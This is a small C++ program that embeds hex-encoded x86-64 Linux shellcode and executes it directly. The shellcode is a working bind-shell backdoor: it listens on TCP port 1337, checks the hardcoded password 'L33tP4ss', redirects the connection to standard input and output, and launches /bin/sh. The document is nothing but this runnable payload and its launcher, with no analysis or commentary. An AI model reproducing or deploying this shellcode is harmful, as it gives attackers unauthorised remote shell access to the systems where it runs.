#include <iostream>

unsigned char code[] = "\x31\xff\xf7\xe7\xff\xc7\x89\xfe\xff\xc7\xb0\x29\x0f\x05\x89\xd3\x52\x66\x68\x05\x39\x66\x57\x89\xc7\x48\x89\xe6\xb2\x10\xb0\x31\x0f\x05\x89\xde\xb0\x32\x0f\x05\x99\xb0\x2b\x0f\x05\x97\x48\x89\xe6\xb2\x08\x89\xd8\x0f\x05\x48\x87\xfe\x48\xb8\x4c\x33\x33\x74\x50\x34\x73\x73\x48\xaf\x48\x87\xfe\x75\xe3\x89\xde\x31\xc0\x83\xc6\x03\xff\xce\xb0\x21\x0f\x05\x75\xf8\xb0\x3b\x53\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x89\xde\x99\x0f\x05";

int main() {

    std::cout << "Shellcode size : " << sizeof(code) << std::endl;

    void (* run)() = (void (*)()) code;

    run();
    return 0;
}
